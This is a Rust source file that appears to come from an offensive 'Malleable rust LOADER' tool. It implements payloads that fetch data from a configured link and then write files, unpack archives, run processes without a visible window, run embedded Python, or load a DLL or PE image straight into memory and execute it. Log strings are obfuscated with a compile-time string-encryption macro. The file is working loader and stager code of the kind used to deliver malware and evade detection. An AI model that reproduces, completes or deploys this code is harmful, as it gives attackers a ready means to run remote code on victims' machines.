use crate::config::Config;
use crate::link::{Link, LinkFetch};
use crate::payload_util::calculate_path;
use crate::payload_util::create_diretory;
use crate::payload_util::same_hash_sha512;
use crate::rundata::RunData;

#[cfg(target_os = "linux")]
use crate::payload_util::fail_linux_message;
#[cfg(target_os = "linux")]
use crate::payload_util::set_permission;

#[cfg(target_os = "windows")]
use std::os::raw::c_int;
#[cfg(target_os = "windows")]
type DllEntryPoint = extern "C" fn();
//type DllEntryPoint = extern "C" fn() -> c_int;
#[cfg(target_os = "windows")]
use crate::python_embedder;
#[cfg(target_os = "windows")]
use rspe::reflective_loader;
#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::fs::File;
use std::io::stdout;
use std::io::Cursor;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;
use std::process::Stdio;
use std::{thread, time};

use cryptify::encrypt_string;
use log::debug;
use log::error;
use log::info;

pub enum PayloadExecThread {
    NoThread(),
    Thread(thread::JoinHandle<()>, Payload),
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub enum Payload {
    Banner(),
    WriteFile(WriteFile),
    WriteZip(WriteZip),
    Exec(Exec),
    ExecPython(ExecPython),
    DllFromMemory(DllFromMemory),
    ReflectivePEFromMemory(ReflectivePEFromMemory),
}
impl Payload {
    pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
        let exec_result = match &self {
            Payload::Banner() => banner(),
            Payload::WriteFile(payload) => payload.write_file(config),
            Payload::WriteZip(payload) => payload.write_zip(config),
            Payload::Exec(payload) => payload.exec_file(),
            Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
            Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
            Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
        };

        match exec_result {
            Ok(a) => a,
            Err(e) => {
                error!("{}{}", encrypt_string!("exec error: "), e);

                PayloadExecThread::NoThread()
            }
        }
    }
    pub fn print_payload(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_payload_compact(&self) {
        debug!("+{:?}", self);
    }
    pub fn string_payload_compact(&self) -> String {
        format!("{:?}", self)
    }
    pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
        let self_serialized = serde_json::to_string(self).unwrap();
        let other_serialized = serde_json::to_string(other_payload).unwrap();
        self_serialized == other_serialized
    }
    pub fn is_already_running_or_runonce(&self, run_data: &mut RunData) -> bool {
        for running_payload in &mut *run_data.running_thread {
            if self.is_same_payload(&running_payload.1) {
                info!("{}", encrypt_string!("Payload is already running"));
                return true;
            }
        }
        for running_once in &mut *run_data.runonce {
            if self.is_same_payload(&running_once) {
                info!("{}", encrypt_string!("Payload already run once"));
                return true;
            }
        }
        return false;
    }

    pub fn is_runonce(&self) -> bool {
        match &self {
            Payload::Banner() => false,
            Payload::WriteFile(payload) => payload.runonce,
            Payload::WriteZip(payload) => payload.runonce,
            Payload::Exec(payload) => payload.runonce,
            Payload::ExecPython(payload) => payload.runonce,
            Payload::DllFromMemory(payload) => payload.runonce,
            Payload::ReflectivePEFromMemory(payload) => payload.runonce,
        }
    }
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct DllFromMemory {
    pub link: Link,
    pub dll_entrypoint: String,
    pub thread: bool,
    pub runonce: bool,
}

impl DllFromMemory {
    #[cfg(target_os = "linux")]
    pub fn dll_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
        Ok(PayloadExecThread::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn dll_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread_dll_entrypoint = self.dll_entrypoint.clone();
            let dllthread = thread::spawn(move || {
                let dll_data: &[u8] = &data;

                info!("{}", encrypt_string!("Map DLL in memory"));
                let mm = memorymodule_rs::MemoryModule::new(dll_data);

                info!(
                    "{}{}",
                    encrypt_string!("Retreive DLL entrypoint: "),
                    &thread_dll_entrypoint
                );
                let dll_entry_point = unsafe {
                    mem::transmute::<_, DllEntryPoint>(mm.get_function(&thread_dll_entrypoint))
                };
                info!("{}", encrypt_string!("dll_entry_point()"));

                let result = dll_entry_point();
                drop(mm);
                info!("drop");
                //debug!("{}{}", encrypt_string!("DLL result = "), result);
            });
            return Ok(PayloadExecThread::Thread(
                dllthread,
                Payload::DllFromMemory(self.clone()),
            ));
        } else {
            let dll_data: &[u8] = &data;
            info!("{}", encrypt_string!("Map DLL in memory"));
            let mm = memorymodule_rs::MemoryModule::new(dll_data);

            info!(
                "{}{}",
                encrypt_string!("Retreive DLL entrypoint: "),
                &self.dll_entrypoint
            );
            let dll_entry_point = unsafe {
                mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint))
            };
            info!("{}", encrypt_string!("dll_entry_point()"));

            let result = dll_entry_point();
            drop(mm);
            info!("drop");
            //debug!("{}{}", encrypt_string!("DLL result = "), result);
            return Ok(PayloadExecThread::NoThread());
        }
        // TODO quand on part d'ici, il y a un probleme
    }
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct ExecPython {
    pub path: String, //path of python directory
    pub python_code: String,
    pub thread: bool,
    pub runonce: bool,
}
impl ExecPython {
    #[cfg(target_os = "linux")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
        return Ok(PayloadExecThread::NoThread());
    }

    #[cfg(target_os = "windows")]
    pub fn exec_python_with_embedder(&self) -> Result<PayloadExecThread, anyhow::Error> {
        //use crate::python_embedder;

        let path: PathBuf = calculate_path(&self.path)?;

        info!(
            "{}{}\n",
            encrypt_string!("execute python with Embedder: "),
            &self.python_code
        );
        if self.thread {
            let thread_python_path = path.clone();
            let thread_python_code = self.python_code.clone();
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                python_embedder::embedder(&thread_python_path, &thread_python_code);
            });
            return Ok(PayloadExecThread::Thread(
                tj,
                Payload::ExecPython(self.clone()),
            ));
        } else {
            python_embedder::embedder(&path, &self.python_code);
            return Ok(PayloadExecThread::NoThread());
        }
    }
}

pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
    //TODO encrypt this str
    let banner: &str = r#"
                                 ╓╖
                         , ▒╗,  ▒▒▒▒╖   ╓▒▒
  Malleable                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
 ┬─┐┬ ┬┌─┐┌┬┐        ▒▒@▒╓▒░░░░░░▒▒▒▒▒▒▒▒▒╢▓╖╓╓╖H┐
 ├┬┘│ │└─┐ │          ▒░░░░▒``▒░░░░░▒▒▒▒▒▒╢▒╢╢▒▒░`
 ┴└─└─┘└─┘ ┴   ,╓╓╓╥           ░░░░░░░▒▒▒▒▒▒▒▒▒╢╢
   LOADER      `  ▒`               ░░░░▒▒▒▒▒▒▒╢╢▒╣▒ÑH╗
                          ,▄       ░░░▒▒▒▒▒▒▒╢▒▒▒╢▒▒▒╜
               ╓╖       ╓  ██     ░▓``██▒▒▒▒▒▒▒╢▒╢╣╣
                │       █████▌   ░▐█,▄███▒▒░░▒▒▒▒╢╢╢@╖
                ╙▒      └███▀     └█████▌Ñ░░░▒▒▒▒╢╢╣▒▒░╣
                 .¿          ▄▄▄▄▄▄░"▀▀ `░░░▒▒╫╣╢╢╢╢╣╣╓▒▒
                     :``  ,, ╙████▀   ,  ░╫╬Ñ╜▒▒▒▒▒╣╢╫@▒╙▓╖
               ,░      ▒╢╫╢╢▓▒╜H   ░  ╨╨╜╙╙░  '▒▒╢▒▒▒╢▒╣▓▒▓▓╖
                  ▒ ░  ▒╙╢╢╢╢▓,               ` ░▒▒╢▒▒▒╢▒▓░╙╢N
               └╜▒▒@@  '░▒╢╣╢╢╣@,           ╓░▒ ▒░▒▒╢▒▒╣▒╢╣ ╙╙▒
                      ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                        ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                          "╨▒╜╢╢Ñ                  ░▒╜
                                                 ``a "#;

    info!("{}", encrypt_string!("BANNER"));
    let sleep_time = time::Duration::from_millis(3);
    for c in banner.chars() {
        print!("{}", c);
        let _ = stdout().flush();
        thread::sleep(sleep_time);
    }
    println!("");
    let sleep_time = time::Duration::from_millis(3000);
    thread::sleep(sleep_time);
    Ok(PayloadExecThread::NoThread())
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct WriteZip {
    pub link: Link,
    pub path: String,
    pub runonce: bool,
}

impl WriteZip {
    pub fn write_zip(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        //TODO found a way, not to recreate everything every time this payload run
        let path: PathBuf = calculate_path(&self.path)?;
        let _ = create_diretory(&path)?;

        let archive: Vec<u8> = self.link.fetch_data(config)?;

        info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
        match zip_extract::extract(Cursor::new(archive), &path, true) {
            Ok(_) => {}
            Err(error) => {
                error!(
                    "{}{}",
                    encrypt_string!("error to unzip python lib: "),
                    error
                )
            }
        }

        Ok(PayloadExecThread::NoThread())
    }
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct WriteFile {
    pub link: Link,
    pub path: String,
    pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
    pub runonce: bool,
}

impl WriteFile {
    pub fn write_file(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;

        if same_hash_sha512(&self.hash, &path) == false {
            let _ = create_diretory(&path)?;

            let body: Vec<u8> = self.link.fetch_data(config)?;

            info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
            let mut f = File::create(&path)?;
            f.write_all(&body)?;
        } else {
            info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
        }
        Ok(PayloadExecThread::NoThread())
    }
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct Exec {
    pub path: String,
    pub cmdline: String,
    pub thread: bool,
    pub runonce: bool,
    pub visible: bool,
}
/*
impl Exec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;
        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
        let mut comm = Command::new(&path);

        #[cfg(target_os = "linux")]
        set_permission(&path);

        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                let mut c = comm
                    .spawn()
                    .expect(&encrypt_string!("failed to execute process"));
                let _ = c.wait();
            });
            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
        } else {
            let _output: std::process::Output = comm
                .output()
                .expect(&encrypt_string!("failed to execute process"));
            //let _hello: Vec<u8> = output.stdout;
                return Ok(PayloadExecThread::NoThread());
        };
    }
}
*/


impl Exec {
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
        let path: PathBuf = calculate_path(&self.path)?;
        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
        let mut comm = Command::new(&path);

        #[cfg(target_os = "linux")]
        set_permission(&path);

        for i in self.cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        if self.thread {
            let thread_visible = self.visible;
            let tj: thread::JoinHandle<()> = thread::spawn(move || {
                if thread_visible {
                    let _output = comm.spawn().expect("Failed to execute process");
                } else {
                    comm.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());

                    #[cfg(target_os = "windows")]
                    comm.creation_flags(CREATE_NO_WINDOW);

                    let _output = comm.output().expect("Failed to execute process");
                };
            });
            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
        } else {
            if self.visible {
                let _output = comm.spawn().expect("Failed to execute process");
            } else {
                comm.stdin(Stdio::null())
                    .stdout(Stdio::null())
                    .stderr(Stdio::null());

                #[cfg(target_os = "windows")]
                comm.creation_flags(CREATE_NO_WINDOW);

                let _output = comm.output().expect("Failed to execute process");
            };
            return Ok(PayloadExecThread::NoThread());
        };
    }
}

#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
pub struct ReflectivePEFromMemory {
    pub link: Link,
    pub thread: bool,
    pub runonce: bool,
}

impl ReflectivePEFromMemory {
    #[cfg(target_os = "linux")]
    pub fn reflective_pe_from_memory(
        &self,
        _config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        fail_linux_message(format!("{}", encrypt_string!("ReflectivePEFromMemory")));
        Ok(PayloadExecThread::NoThread())
    }

    #[cfg(target_os = "windows")]
    pub fn reflective_pe_from_memory(
        &self,
        config: &Config,
    ) -> Result<PayloadExecThread, anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data(config)?;

        if self.thread {
            let thread = thread::spawn(move || {
                info!("{}", encrypt_string!("ReflectivePEFromMemory"));
                unsafe {
                    reflective_loader(data.clone());
                };
            });
            return Ok(PayloadExecThread::Thread(
                thread,
                Payload::ReflectivePEFromMemory(self.clone()),
            ));
        } else {
            info!("{}", encrypt_string!("ReflectivePEFromMemory"));
            unsafe {
                reflective_loader(data.clone());
            };
            return Ok(PayloadExecThread::NoThread());
        }
    }
}
